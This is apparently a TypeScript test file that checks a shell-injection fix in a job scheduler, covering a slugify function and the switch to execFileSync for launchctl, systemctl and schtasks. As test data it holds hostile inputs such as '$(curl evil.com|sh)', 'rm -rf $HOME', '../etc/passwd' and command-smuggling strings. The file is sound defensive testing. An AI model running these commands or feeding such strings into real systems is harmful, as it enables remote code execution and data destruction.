import { describe, test, expect } from "bun:test"
import { readFileSync } from "node:fs"
import { join } from "node:path"
import { slugify } from "../src/index.ts"

const REPO_ROOT = join(import.meta.dir, "..")
const SRC = readFileSync(join(REPO_ROOT, "src", "index.ts"), "utf8")

describe("Patch B: slugify — shell-injection neutralization", () => {
  test("plain ASCII name passes through", () => {
    expect(slugify("daily-report")).toBe("daily-report")
    expect(slugify("My Job 123")).toBe("my-job-123")
  })

  test("shell metacharacters are stripped to dashes", () => {
    expect(slugify("foo;rm -rf /")).toBe("foo-rm-rf")
    expect(slugify('a"$(touch /tmp/pwn)"')).toBe("a-touch-tmp-pwn")
    expect(slugify("`whoami`")).toBe("whoami")
    expect(slugify("$IFS")).toBe("ifs")
    expect(slugify("name|pipe")).toBe("name-pipe")
    expect(slugify("a&b")).toBe("a-b")
    expect(slugify("a;b")).toBe("a-b")
  })

  test("unicode and quotes are neutralized", () => {
    expect(slugify("café")).toBe("caf")
    expect(slugify("'evil'")).toBe("evil")
    expect(slugify('"double"')).toBe("double")
    expect(slugify("name with spaces")).toBe("name-with-spaces")
  })

  test("leading/trailing dashes are trimmed", () => {
    expect(slugify("---foo---")).toBe("foo")
    expect(slugify("   bar   ")).toBe("bar")
  })

  test("output matches [a-z0-9-]+ only — locked contract for safety", () => {
    const malicious = [
      '"; touch /tmp/pwn; #',
      "$(curl evil.com|sh)",
      "`malicious`",
      "name\nwith\nnewlines",
      "name\twith\ttabs",
      "../etc/passwd",
      "name;rm -rf $HOME",
    ]
    for (const input of malicious) {
      const out = slugify(input)
      expect(out).toMatch(/^[a-z0-9-]*$/)
      expect(out).not.toContain(";")
      expect(out).not.toContain("$")
      expect(out).not.toContain("`")
      expect(out).not.toContain("|")
      expect(out).not.toContain("&")
      expect(out).not.toContain('"')
      expect(out).not.toContain("'")
      expect(out).not.toContain(" ")
      expect(out).not.toContain("/")
      expect(out).not.toContain("\\")
    }
  })
})

describe("Patch B: schedule_job feeds args.source through slugify", () => {
  test("schedule_job.execute uses slugify(args.source) when source provided", () => {
    expect(SRC).toMatch(/slugify\(args\.source\)/)
  })

  test("args.source never reaches an OS scheduler call un-slugified", () => {
    // CVE-prevention regression: pre-fix, args.source interpolated into a shell template
    // passed to execSync("systemctl ...", { shell:true }). Post-fix, all OS calls are
    // execFileSync + slugify(args.source). Other `${args.source}` JS template literals
    // (e.g. j.slug.startsWith) are pure string compares and not shell vectors.
    const dangerous = SRC.match(/execSync\(`[^`]*\$\{args\.source\}[^`]*`/g) ?? []
    expect(dangerous).toEqual([])
  })

  test("install/uninstall paths use execFileSync (not execSync) for launchctl and systemctl", () => {
    // Extract the install/uninstall block roughly (systemd + launchctl).
    // Any execSync("launchctl", ...) or execSync("systemctl", ...) inside is a regression.
    const systemdRegion = SRC.slice(
      SRC.indexOf("function installSystemdJob"),
      SRC.indexOf("function installLaunchdJob") > -1 ? SRC.indexOf("function installLaunchdJob") : SRC.length
    )
    expect(systemdRegion).not.toMatch(/execSync\([\`"]launchctl/)
    expect(systemdRegion).not.toMatch(/execSync\([\`"]systemctl/)
  })
})

describe("Patch B: execFileSync is the OS-scheduler primitive", () => {
  test("launchctl calls all use execFileSync with arg array", () => {
    const matches = SRC.match(/execFileSync\(\s*["']launchctl["']\s*,/g) ?? []
    expect(matches.length).toBeGreaterThanOrEqual(3)
  })

  test("systemctl --user calls all use execFileSync with arg array", () => {
    const matches = SRC.match(/execFileSync\(\s*["']systemctl["']\s*,\s*\[\s*["']--user["']/g) ?? []
    expect(matches.length).toBeGreaterThanOrEqual(5)
  })

  test("schtasks calls all use execFileSync with arg array", () => {
    const matches = SRC.match(/execFileSync\(\s*["']schtasks["']\s*,/g) ?? []
    expect(matches.length).toBeGreaterThanOrEqual(2)
  })
})